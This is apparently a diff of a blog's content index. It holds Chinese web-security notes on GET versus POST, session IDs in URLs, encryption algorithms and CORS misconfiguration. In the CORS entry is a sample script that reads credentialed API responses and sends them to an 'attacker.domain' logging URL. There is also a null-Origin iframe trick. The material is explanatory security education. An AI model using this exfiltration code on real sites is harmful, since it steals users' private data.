+<li>使用HTTP POST方法代替GET方法来提交敏感信息表单，禁止使用表单的隐藏字段来传递敏感信息；不依赖HTTP头信息，对客户端提交的HTTP头进行过滤</li>
+</ul>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>为了保证认证状态并追踪用户在web应用程序中的进度，应用程序为用户提供了会话ID（会话标识符），该标识符会在创建会话时分配，并被用户及Web应用程序在会话期间共享和交换。会话ID 是一个键值对：name=value，为了实现安全的会话ID,会话ID的生成要满足以下四个特性：</p>
+<ul>
+<li>会话ID的名称不应该极具描述性，也不应该提供有关ID的用途或含义等不必要的细节。</li>
+<li>会话ID的长度必须足够长以防止暴力攻击，否则攻击者可以遍历所有ID值并验证是否存在有效会话。</li>
+<li>会话ID的熵。会话ID必须时不可预知的，具有足够的随机性，防止被猜测。</li>
+<li>会话ID的内容必须的是客户端的标识符，但不得包含敏感信息，与会话ID关联的业务及应用的逻辑必须存储在服务端</li>
+</ul>
+<h3 id="0x01-POST与GET的区别"><a href="#0x01-POST与GET的区别" class="headerlink" title="0x01 POST与GET的区别"></a>0x01 POST与GET的区别</h3><p>两种HTTP请求方法：GET和POST。</p>
+<p>GET方式的请求是把http header和data一并发送，服务器响应200（返回数据）</p>
+<p>POST方式的请求是先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok(返回数据)</p>
+<p><strong>GET</strong>: 从指定的资源请求数据</p>
+<p><strong>POST</strong>: 向指定的资源提交要被处理的数据</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th align="center">GET</th>
+<th align="center">POST</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>后退按钮/刷新</td>
+<td align="center">无害</td>
+<td align="center">数据会被重新提交（浏览器应该告知用户数据会被重新提交）</td>
+</tr>
+<tr>
+<td>书签</td>
+<td align="center">可收藏为书签</td>
+<td align="center">不可收藏为书签</td>
+</tr>
+<tr>
+<td>缓存</td>
+<td align="center">能被缓存</td>
+<td align="center">不能缓存</td>
+</tr>
+<tr>
+<td>编码类型</td>
+<td align="center">application/x-www-form-urlencoded</td>
+<td align="center">application/x-www-form-urlencoded or multipart/form-data。为二进制数据使用多重编码</td>
+</tr>
+<tr>
+<td>历史</td>
+<td align="center">参数保存在浏览器历史中</td>
+<td align="center">参数不会保存在浏览器历史中</td>
+</tr>
+<tr>
+<td>对数据长度的限制</td>
+<td align="center">限制。当发送数据时，GET方法向URL添加数据；URL的长度是受限制的（URL的最大长度是2048个字符）。</td>
+<td align="center">无限制</td>
+</tr>
+<tr>
+<td>对数据类型的限制</td>
+<td align="center">只允许ASCII字符</td>
+<td align="center">无限制，也允许二进制数据</td>
+</tr>
+<tr>
+<td>安全性</td>
+<td align="center">与POST相比，GET的安全性较差，因为所发送的数据是URL的一部分。在发送密码或其他敏感信息时不可以使用GET</td>
+<td align="center">POST比HGET更安全，因为参数不会保存在浏览器历史或web服务器日志中</td>
+</tr>
+<tr>
+<td>可见性</td>
+<td align="center">数据在URL中对所有人都是可见的</td>
+<td align="center">数据不会显示在URL</td>
+</tr>
+</tbody></table>
+<h3 id="0x02-漏洞介绍"><a href="#0x02-漏洞介绍" class="headerlink" title="0x02 漏洞介绍"></a>0x02 漏洞介绍</h3><ul>
+<li>对于GET的请求，浏览器会把http header和data一并发送，同时GET的url地址可以被收藏成书签，只支持进行url编码。</li>
+<li>如果URL中包含会话ID，可能导致会话ID泄露以及促使其他攻击，如操纵会话ID，会话ID固定攻击。</li>
+<li>敏感数据使用Get进行传输时，因为数据都在URL中，即会导致敏感信息的泄露。</li>
+<li>发送敏感数据时选择使用HTTP Post，不选择GET,因为不会保存在浏览历史或者Web服务器的日志中。</li>
+<li>隐藏字段的内容用户无法操作该元素，但是通过查看源代码可以看到隐藏元素的值，所以不要用隐藏字段传递敏感信息。</li>
+<li>如果不对用户提交的参数做过滤直接输出到HTTP 响应头中，导致攻击者可以利用该漏洞来注入到HTTP响应头实现攻击。</li>
+</ul>
+<p><strong>安全要求</strong></p>
+<ul>
+<li><p>使用HTTP POST方式提交表单。</p>
+<p>说明：Get请求可以通过构造img等标签发起，造成CSRF</p>
+</li>
+</ul>
+<h3 id="0x03-检测方法"><a href="#0x03-检测方法" class="headerlink" title="0x03 检测方法"></a>0x03 检测方法</h3><ul>
+<li><p><strong>前置条件</strong></p>
+<ol>
+<li>已经明确定义敏感数据范围（比如口令、短信验证码和身份证号码等）</li>
+<li>待测Web应用可访问，业务正常</li>
+<li>已安装http拦截代理（burp、fiddler或webscarab均可）</li>
+</ol>
+</li>
+<li><p><strong>执行步骤</strong></p>
+<ol>
+<li>开启Burp，设置对Http请求进行拦截，并在浏览器中配置代理</li>
+<li>访问Web页面并提交敏感数据</li>
+<li>在burp拦截到的http请求中，检查敏感数据是否是使用POST请求方式进行提交</li>
+</ol>
+</li>
+<li><p><strong>预测结果</strong></p>
+<p>敏感数据使用POST进行提交</p>
+</li>
+<li><p>备注：使用GET提交数据可能会被记录在web server日志或缓存在浏览器中。</p>
+</li>
+</ul>
+<h3 id="0x04-安全建议"><a href="#0x04-安全建议" class="headerlink" title="0x04 安全建议"></a>0x04 安全建议</h3><ul>
+<li>不要在URL中暴露会话标识符，会话标识应当只出现在http头信息中，不要将会话标识符以GET参数进行传递</li>
+<li>使用HTTP POST方法代替GET方法来提交敏感信息表单，禁止使用表单的隐藏字段来传递敏感信息；不依赖HTTP头信息，对客户端提交的HTTP头进行过滤</li>
+</ul>
+<h3 id="0x05-漏洞实例"><a href="#0x05-漏洞实例" class="headerlink" title="0x05 漏洞实例"></a>0x05 漏洞实例</h3><p> <a href="http://jira.gaiaworks.cn:8089/browse/SPM-5390" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/SPM-5390</a> </p>
+<p> <a href="http://jira.gaiaworks.cn:8089/browse/MPH-751" target="_blank" rel="noopener">http://jira.gaiaworks.cn:8089/browse/MPH-751</a> </p>
+<p>……</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的数据传输</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：会话令牌不应写入URL</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E4%BC%9A%E8%AF%9D%E4%BB%A4%E7%89%8C%E4%B8%8D%E5%BA%94%E5%86%99%E5%85%A5URL/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的数据传输</p>
+<p>安全要求：不要在URL中暴露会话标识符，会话标识符应当只出现在HTTP头消息中，不要将会话标识符以GET参数进行传递</p>
+<p><strong>具体内容参照敏感数据GET传输</strong></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的数据传输</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：登录信息不应写入URL</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF%E4%B8%8D%E5%BA%94%E5%86%99%E5%85%A5URL/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的数据传输</p>
+<p>安全要求：不要在URL中暴露会话标识符，会话标识符应当只出现http头信息中，不要将会话标识符以GET参数进行传递</p>
+<p><strong>详细了解参照敏感数据GET传输</strong></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的数据传输</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：脆弱的加密方式</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E8%84%86%E5%BC%B1%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的数据传输</p>
+<p>安全要求：对于互联网传输的敏感信息应采取加密方式传输，如用户名、密码、卡号、ID等。请求中含有敏感信息（如订单号、ID等），应加密处理后传输，防止产生参数遍历获取信息风险。</p>
+<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>按照密码体制的不同，密码学算法可以分为以下三类：</p>
+<ul>
+<li>分组加密。分组加密也成为块加密，是将明文消息划分为长度为n的组，n值根据算法的不同而变化，每组分别在密钥的控制下变换成长度相等的输出数字序列。如对称加密的DES、AES等算法，非对称加密算法RSA</li>
+<li>流加密。流加密使用伪随机数生成器（PRNG）根据密钥生成一个与明文长度相同的密钥流，然后使用密钥流与明文流进行异或运算，如RC4等堆成加密算法属于流加密。常用于视频和音乐等数据的加密。</li>
+<li>量子加密。量子密码学是基于单个光子和它固有量子属性而开发的不可破解的密码体系。量子的不可克隆是量子通信安全的根本来源。</li>
+</ul>
+<p>按密码学的发展大致可以分成以下三个阶段</p>
+<ul>
+<li>早期密码（古典密码）对整个加密过程保密</li>
+<li>现代密码（对称加密），公开算法细节，密码的安全性仅依赖加密密钥</li>
+<li>公钥密码（非对称加密），加密不用秘密钥，秘密钥仅在解密阶段使用</li>
+</ul>
+<h3 id="0x01-对称加密算法"><a href="#0x01-对称加密算法" class="headerlink" title="0x01 对称加密算法"></a>0x01 对称加密算法</h3><ul>
+<li><p><strong>DES/3DES</strong></p>
+<p>DES是现代第一个对称加密算法。属于分组密码，明文分组长度为64位，产生的密文长度为64位，有效密钥长度为56位。DES被认为仅有的最严重的缺点就是密钥长度太短，有效长度只有56位，易遭受穷举密钥攻击，即利用一个已知明文或密文进行穷举测试，直到找到正确的密钥。为了弥补DES的缺陷，衍生了3DES算法，原理是对明文先加密，再解密，最后再加密，三次加解密操作推荐使用不同的密钥，其有效长度相当于112位。</p>
+<p>由于DES的缺陷，严禁使用DES进行加解密操作，虽然3DES对DES进行了加强，但密钥长度仍不能满足安全的需求（要求密钥最小长度为128位），因此，除非强制要求，尽量不要使用3DES。此外经过3*16轮的变换，3DES的加解密效率也比较低。</p>
+</li>
+<li><p><strong>AES</strong></p>
+<p>AES算法有以下特征：</p>
+<ul>
+<li>属于分组加密</li>
+<li>分组长度和密长度均独立可变</li>
+<li>轮变换次数根据密钥及分组长度而定，例128位长度的密钥需要10次轮变换，256位需14次论变换</li>
+<li>轮密钥根据公开密钥表导出，不同轮密钥的长度不同</li>
+<li>算法公开</li>
+</ul>
+<p>AES的加密依赖四个可逆函数：</p>
+<ul>
+<li>SubBytes字节替换</li>
+<li>ShiftRow行移位</li>
+<li>MixColumns 列混合变换</li>
+<li>AddRoundKey 轮密钥加变换</li>
+</ul>
+<p>AES是目前对称加密最常用的加密算法，使用时要求最小密钥长度为128位，可变的密钥长度及分组长度为各种应用需求提供了可选的安全强度，同时密钥的减少不仅简化了安全协议和系统的设计，也提升了加密和解密的效率。</p>
+</li>
+</ul>
+<h3 id="0x02-非对称加密算法"><a href="#0x02-非对称加密算法" class="headerlink" title="0x02 非对称加密算法"></a>0x02 非对称加密算法</h3><p>非对称加密是基于数学难题进行构建，主要是基于以下三个数学难题：</p>
+<p>1). 大整数分解（IFP)，用于RSA</p>
+<p>2). 离散对数问题（DLP），用于DH、DHA和DSA</p>
+<p>3). 椭圆曲线离散对数问题（ECDLP），用于ECC、ECDH、ECDHE和ESDSA</p>
+<ul>
+<li><p><strong>RSA</strong></p>
+<p>RSA算法既可以用于密钥交换，又可以用于验证签名，即RSA私钥加密得数据所对应得RSA公钥可以解密该数据，并验证该数据是否为RSA私钥加密，相当于签名得效果，反之公钥加密得数据只有对应得私钥能够解密。</p>
+<p>基于安全性的考虑，推荐RSA密钥最小长度为2048位。目前RSA主要用于签名和验证认证，不用于密钥交换，因为RSA无法保证前向保密性。</p>
+</li>
+<li><p><strong>DH</strong></p>
+<p>对称密码系统最难解决的问题便是密钥交换问题，DH（Diffie-Hellman）指数密钥交换协议，是第一个无需安全信道就能实现密钥交换的方案。但实际应用中很少直接只用DH进行密钥交换，因为DH无法保证前向保密性。</p>
+</li>
+<li><p><strong>DHE</strong></p>
+<p>DHE全称为Ephemeral Diffie-Hellman，与DH交换密钥的方式相同，主要区别在于用于生成本地对称密钥的参数都是临时生成的，并且不会保存，即保证了前向保密性。推荐DHE的最小密钥长度位2048位。</p>
+</li>
+<li><p><strong>DSA</strong></p>
+<p>DSA是Schnorr、ELGamal签名算法的变种，被NIST作为数字签名标准（DSS)。DSA基于整数有限域离散对数难题，安全性与RSA相当，因此推荐DSA的最小密钥长度为2048位。由于DSA的安全性依赖于熵源的选择，基于安全性及便利性的考虑，一般使用RSA进行数字签名。</p>
+</li>
+<li><p><strong>ECC</strong></p>
+<p>椭圆曲线加密算法（ECC)基于椭圆曲线离散对数问题，给定椭圆曲线上的一个点G，并选择一个整数k，易求解K=k*G，其中K也是椭圆曲线上的一个点。但是反过来，知道椭圆曲线上的两个点K、G，求解k是一个难题，所以被称为椭圆曲线离散对数问题。</p>
+</li>
+<li><p><strong>ECDH</strong></p>
+<p>ECDH是基于椭圆曲线离散对数问题的密钥交换算法。与DH相比，其便利性在于将复杂的求幂运算转化为简单的乘法（累加）运算，且在同等密钥长度的前提下，其安全性远高于DH。推荐ECDH的最小密钥长度为256位，ECDH不能保证前向保密性，因此实际应用中很少直接使用ECDH进行密钥交换。</p>
+</li>
+<li><p><strong>ECDHE</strong></p>
+<p>ECDHE与ECDH交换密钥的方式相同，主要区别在于生成本地对称密钥的参数都是临时生成的，并且不会保存，这样保证了前向保密性。推荐使用ECDHE的最小密钥长度位256位。ECDHE是目前交换密钥的推荐算法。</p>
+</li>
+<li><p><strong>ECDSA</strong></p>
+<p>ECDSA与DSA类似，是基于椭圆曲线离散对数问题实现的签名算法，推荐最小密钥长度位256位，与DSA类似，其安全性依赖于熵源的选择，基于安全性和便利性考虑，一般使用RSA进行数字签名。</p>
+</li>
+</ul>
+<h3 id="0x03-传输层安全检测工具"><a href="#0x03-传输层安全检测工具" class="headerlink" title="0x03 传输层安全检测工具"></a>0x03 传输层安全检测工具</h3><p>可以使用多种工具对网站传输层的安全进行检测，检测工具可以分为两种：本地工具和在线工具，常见工具如下：</p>
+<ul>
+<li><p><strong>本地工具</strong></p>
+<p>O-Saft：<a href="https://www.owasp.org/index.php/O-Saft" target="_blank" rel="noopener">https://www.owasp.org/index.php/O-Saft</a></p>
+<p>SSLScan：<a href="http://sourceforge.net/projects/sslscan" target="_blank" rel="noopener">http://sourceforge.net/projects/sslscan</a></p>
+<p>SSLyze：<a href="https://github.com/iSECPartners/sslyze" target="_blank" rel="noopener">https://github.com/iSECPartners/sslyze</a></p>
+<p>SSL Audit：<a href="http://www.g-sec.lu/tools.html" target="_blank" rel="noopener">http://www.g-sec.lu/tools.html</a></p>
+</li>
+<li><p><strong>在线工具</strong></p>
+<p>SSL Server Test：<a href="https://www.ssllabs.com/ssltest" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest</a></p>
+<p>Observatory by Mozilla：<a href="https://observatory.mozilla.org/" target="_blank" rel="noopener">https://observatory.mozilla.org/</a></p>
+<p>High-Tech Bridge：<a href="https://www.htbridge.com/ssl/" target="_blank" rel="noopener">https://www.htbridge.com/ssl/</a></p>
+</li>
+</ul>
+<p>下面使用在线工具对传输层的安全进行检测。以<a href="https://secrettest.gaiaworkforce.com为例" target="_blank" rel="noopener">https://secrettest.gaiaworkforce.com为例</a></p>
+<p><strong>证书消息</strong>  证书为SHA-256证书、密钥长度为2048位，符合传输层的安全标准</p>
+<p><strong>协议支持</strong>  不支持SSL2.0、SSL3.0协议，支持TLS1.0-1.2</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的数据传输</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：服务器JBoss、WebSphere、WebLogin等</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8JBoss%E3%80%81WebSphere%E3%80%81WebLogin%E7%AD%89/</url>
+    <content><![CDATA[<ul>
+<li><p><strong>tomcat</strong> 是中小型项目中喜欢使用的服务器，在web应用中也称为容器，tomcat是典型的servlet容器，若仅仅针对于servlet,tomcat足矣，但是javaee推出的不仅仅是servlet规范，还推出了jpa,jndi，jms，servlet,jta,validation,jsf等等。完整规范参照Oracle官方文档。</p>
+<p>因此类似于JBoss、WebShpere、WebLogic等javaee全栈型服务器即派上用场。</p>
+</li>
+<li><p><strong>JBoss</strong>是一款开源的应用服务器，在过去是很多大型项目的应用服务器，本身支持EJB规范和集群，能够集成tomcat等servlet容器，但性能上存在缺陷，被很多项目所放弃。现在被redHat作为企业级应用平套上的上游基础服务器且更名WildFly，启用效率高，更加轻量级。目前很多企业级的大型应用类似于ERP、SOA系统应用都发布在WildFly上。</p>
+</li>
+<li><p><strong>WebSphere</strong>是IBM电子商务平台上所推出的一款应用服务器，继承了web服务的所有资源，同时也能够对Apache、IIS等其他服务器形成协同并拓展。和JBoss的集成性类似。但时WebShpere为收费，所以安全性强于JBoss，是很多银行和金融类的大型应用应用的选择。</p>
+</li>
+<li><p><strong>WebLogic</strong>目前在EJB分布式应用领域中排名第一的应用服务器，在集群管理和热部署等方面稳定性强于JBoss，配置操作比WebSphere更加简单，而且支持对JSP的扩展，支持HTML，技术比WebShpere更加成熟。市场占有率高，是当前大型企业级分布式应用的选择。</p>
+</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：CORS跨域共享设置不严</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB%E8%AE%BE%E7%BD%AE%E4%B8%8D%E4%B8%A5/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的配置</p>
+<p>安全要求：使用扫描器或人工测试</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>跨域资源共享（Cross-Originn Resource Sharing）主要是用来解决浏览器跨域网络资源访问。Web应用程序在请求与自己的源不同源（域、协议或端口）资源时执行跨源HTTP请求。</p>
+<h3 id="0x01-SOP（Same-Origin-Policy，同源策略）-amp-CORS"><a href="#0x01-SOP（Same-Origin-Policy，同源策略）-amp-CORS" class="headerlink" title="0x01 SOP（Same Origin Policy，同源策略）&amp;CORS"></a>0x01 <strong>SOP（Same Origin Policy，同源策略）&amp;CORS</strong></h3><p>SOP广泛依赖http cookie来维护用户权限，服务端会根据cookie来判断客户端是否合法，能否可以发送机密信息</p>
+<p>同源定义：</p>
+<ul>
+<li>域名</li>
+<li>协议</li>
+<li>tcp端口号</li>
+</ul>
+<p>只要以上三个值是一致的，我们就认为两个资源是同源的。</p>
+<p><img src="https://www.jianjunchen.com/img/blog/2018/SOP-network.png" alt="âåæºç­ç¥âçå¾çæç´¢ç»æ"> </p>
+<p>如图所示a.com网站脚本可以向b.com服务器发送GET请求，但浏览器的SOP会阻止其读取响应内容。</p>
+<p>CORS可以放宽浏览器的同源策略，可以通过浏览器让不同的网站和不同的服务器之间通信。</p>
+<p>CORS的标准定义是：通过设置http头部字段，让客户端有资格跨域访问资源。通过服务器的验证和授权之后，浏览器有责任支持这些http头部字段并且确保能够正确的施加限制。</p>
+<p>主要头部字段包含：“Access-Contorl-Allow-Origin”</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin:http://www.example.com</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>头部字段的”源“可以访客的方式给服务端发送跨域请求并且可以读取返回的响应，这种方式就是同源策略所阻止的。默认情况下此请求不会携带Cookie或者其他凭证，因此不能窃听用户的敏感数据，但服务器可以使用配置</p>
+<p>”Access-Control-Allow-Credentials:true”来启用凭证的传输。</p>
+<p>如果允许多个源进行跨域请求，那么当前只能用通配符进行设置：</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果使用通配符进行设置后，就不能使用携带凭证的设置，因为CORS规范中规定使用使用携带凭证的请求时，必须指定域名，而不能使用通配符。这种限制能够很好的保护用户的凭证信息，但是却可能在下面三种情况下产生问题，从而造成凭证的泄露。</p>
+<ul>
+<li><p>许多服务器根据用户提供的值生成Access-Control-Allow-Origin标头，但是却不会对Origin值进行校验或者校验不严格。如example.com信任以example.com结尾的任何Origin头，此时可以构造hackerexample.com的Origin头。对于包含“Access-Control-* ”的响应，未声明源，那么服务器很有可能根据用户输入生成相关的头信息。如上示例产生的CORS响应头为：</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: http://hackerexample.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>有些服务器会接收Origin: null的跨域请求，产生如下的响应信息</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时可以借助iframe构造Origin为null的跨域请求，示例如下：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;iframe sandbox= <span class="string">"allow-scripts allow-top-navigation allow-forms"</span></span><br><span class="line">	 src=<span class="string">'data:text/html,	</span></span><br><span class="line"><span class="string">	 &lt;script&gt;</span></span><br><span class="line"><span class="string"> 			   var xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string"> 	           var url="http://wxample.com";</span></span><br><span class="line"><span class="string"> 	           xmlhttp.open("GET",url,true);</span></span><br><span class="line"><span class="string"> 	           xmlhttp.send(null);</span></span><br><span class="line"><span class="string"> 		&lt;/script&gt;'</span></span><br><span class="line">&lt;<span class="regexp">/iframe&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>有些服务器同时接收HTTP和HTTPS请求，可以在HTTPS页面下进行同源或跨域请求，打破HTTPS的安全防护进行中间人攻击，但是在有些浏览器中则不允许HTTPS跨域访问HTTP，如Chrome、Firefox.</p>
+</li>
+</ul>
+<h3 id="0x02-泄露用户数据"><a href="#0x02-泄露用户数据" class="headerlink" title="0x02 泄露用户数据"></a>0x02 泄露用户数据</h3><p>当“Access-Control-Allow-Credntials” 设置成true时，利用CORS配置漏洞的攻击就是创建一个JavaScrpt脚本去发送CORS请求，如下：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> req=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.onload=reqListener;</span><br><span class="line">req.open(<span class="string">"get"</span>, <span class="attr">https</span>:<span class="comment">//vulnerable.domain/api/private-data",true);</span></span><br><span class="line">req.withCredentials=<span class="literal">true</span>;</span><br><span class="line">req.send();</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">reqListener</span>(<span class="params"></span>)</span>{</span><br><span class="line">    location=<span class="string">"//attacker.domain/log?response="</span>+<span class="keyword">this</span>.responseText;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+<!--注：XMLHttpRequest()对象发送HTTP请求可以实现网站与服务器之间进行数据交互，可以从URL中获取数据，无需刷新整个页面数据，XMLhttpRequset可以获得任何类型的数据。-->
+
+<!--XMLHttpRequest.open() 初始化一个请求。该方法只能在javascript代码中使用。-->
+
+<!--XMLHttpRequest.withCredentials 一个布尔值，用来指定跨域Access-Control请求是否带有授权信息。如cookie或授权header头。-->
+
+<!--XMLHttpRequest.send() 发送请求。如果请求是异步的，那么该方法将在请求发送后立即返回。XMLHttpRequest请求的类型取决于open()第三个参数async的值，false则是同步模式，true为异步模式-->
+
+<p>当带有目标系统用户凭证的受害者访问带有上述代码的页面时，浏览器就会发送下面的请求到有漏洞的服务器上。</p>
+<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">Get /api/private-data HTTP/1.1</span><br><span class="line">Host： vulnerable.domain</span><br><span class="line">Origin： https://attacker.domain/</span><br><span class="line">Cookie:JSESSION=&lt;redacted&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接收到响应如下：</p>
+<figure class="highlight"><table><tbody><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: Apache-Coyote/1.1</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: https://attacker.domain</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span>: Access-Control-Allow-Origin,Access-Control-Allow-Credentials</span><br><span class="line"><span class="attribute">Vary</span>: Origin</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 01 Jan 1970 12:00:00 GMT</span><br><span class="line"><span class="attribute">Last-Modified</span>: Wed, 02 May 2018 09:07:07 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=ISO-8859-1</span><br><span class="line"><span class="attribute">Date</span>: Wed, 02 May 2018 09:07:07 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 149</span><br><span class="line">{"id":1234567,"name":"Name","surname":"Surname","email":"email@target.local","account":"ACT1234567","balance":"123456,7","token":"top-secret-string"}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>服务器发送了头部字段”Access-Control-Allow-*”给客户端，所以受受害者浏览器允许包含恶意JavaSript代码的页面访问用户的隐私数据。</p>
+<h3 id="0x03-CORS错误配置"><a href="#0x03-CORS错误配置" class="headerlink" title="0x03 CORS错误配置"></a>0x03 CORS错误配置</h3><ul>
+<li><p><strong>反射Origin头</strong></p>
+<p>Access-Control-Allow-Origin只能配置单个Origin，null或*</p>
+</li>
+<li><p><strong>Origin校验错误</strong></p>
+<ol>
+<li>前缀匹配</li>
+<li>后缀匹配</li>
+<li>没有转义‘.’</li>
+<li>包含匹配</li>
+</ol>
+</li>
+<li><p><strong>信任null</strong></p>
+<p>有些开发者在网站上配置信任null，用于与本地file页面共享数据，如下所示：</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: null</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这种相当于无SOP保护</p>
+</li>
+<li><p><strong>HTTPS域信任HTTP域</strong></p>
+<p>如果HTTPS网站配置了CORS且信任HTTP域，就可以通过攻击者劫持信任HTTP域，然后通过这个HTTP域发送域请求中到HTTPS网站，直接阅读HTTPS下受保护的内容。</p>
+<p><img src="C:%5CUsers%5CCardo.li%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191203151334497.png" alt="image-20191203151334497"></p>
+<p>利用CORS误配置实现中间人读取HTTPS网站内容</p>
+</li>
